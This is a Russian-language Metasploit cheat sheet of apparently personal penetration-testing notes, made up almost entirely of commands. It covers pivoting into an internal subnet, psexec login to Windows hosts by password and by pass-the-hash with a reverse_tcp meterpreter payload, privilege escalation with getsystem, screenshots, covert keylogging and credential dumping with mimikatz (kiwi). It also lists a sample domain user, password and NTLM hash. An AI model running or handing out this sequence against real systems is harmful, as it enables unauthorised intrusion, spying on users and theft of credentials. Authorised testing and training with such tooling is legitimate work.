## Metasploit
Все изложенное проверено на работоспособность в Kali2020.04

# Полезные параметры

`exploit -j` позволяет запускать модуль в background (jobify)

`exploit -z` запускает сессию в background (не понял в чем отличие от _-j_)

`jobs` просмотреть список задать в background

`sessions -l` посмотреть список открытых сессий 

# Инициализация базы данных для сохранение информации.

1. Запуст postgresql.

`systemctl start start`

`systemctl enable start`

2. Инициализация БД 

`msfdb init`

3. Смена пароля пользователя msf

`sudo -u postgres psql`

`postgres=#alter user msf password '123456';`

4. Проверка подключения

`msf5 > db_connect msf:123456@localhost/msf`

5. Автоматическое подключение msf к БД и смена пароля.

`nano /usr/share/metasploit-framework/config/database.yml`

# Проброс во внутренюю сеть (pivoting).

1. Используем модуль ssh_login для захода на пограничный узел.

2. Преобразуем ssh-сессию в сессию meterpreter 

`session -u <session_num>`

3. Выходим из сессии meterpreter-а и используем для неё _post/multi/manage/autoroute_

`post/multi/manage/autoroute`

`set SESSION 8`

`set SUBNET 10.100.36.0`

`run`

Если надо распечатать текущий статут autoroute:

`set CMD print`

`run`

# smb_login или psexec модули 

## Доступ по паролю

`use windows/smb/psexec`

`set RHOST 10.100.36.7`

`set SMBDomain company.ru`

`set SMBPass Qwerty2020`

`set SMBUser eborisenko`

### Необходимо проверить payload. Если Windows x64, то его требуется сменить.

`set PAYLOAD payload/windows/x64/meterpreter/reverse_tcp`

`run`

## Доступ по ntlm-хешу.

Если доступен ntlm-хеш, то к нему в начало надо добавить заглушку в виде нулевого LM-хеша

`set SMBPass 00000000000000000000000000000000:7661de2ec1fe5de9d91da21375bc618d`

### Если в Windows включена "Защита в режиме реального времени", то создания сессии не происходит.

Преобразование сессии meterpreter в cmd.exe.

`shell`

# Получение скриншотов 

## Через получение system

1. получаем права псевдопользователя system:

`getsystem` 

2. Снять скриншот.

`screenshot`

## Через нужные процесс 
1. Перемещение в нужный процесс (explorer.exe)

`migrate 260`

2. Снять скриншот.

`screenshot`

*Замечание* обратный переезд зависит от прав, с которыми запущен целевой процесс (explorer.exe с правами авторизованного пользователя)

# Кейлоггинг
1. Перемещение в процесс explorer.exe.

`migrate 260`

2. Запустить запись символов

`keyscan_start`

3. Посмотреть что получилось.

`keyscan_dump`

4. Завершить.

`keyscan_stop`

# Creds dump

1. Из сессии meterpreter нужной разрядность (!) выполняем команду для загрузки mimikatz:

`load kiwi`

2. Извлекаем все возможные креды:

`creds_all`

# Перемещение по диску

`pwd` - вывод текущей директории

`ls` - список файлов

# Если shell не работает, то есть альтернативный варинт

`execute -f cmd.exe -c`

`channel -i <N>`

# Запуск .rc-скрипта 

`msfconsole -r /var/lib/veil/output/handlers/veilpayload.rc`


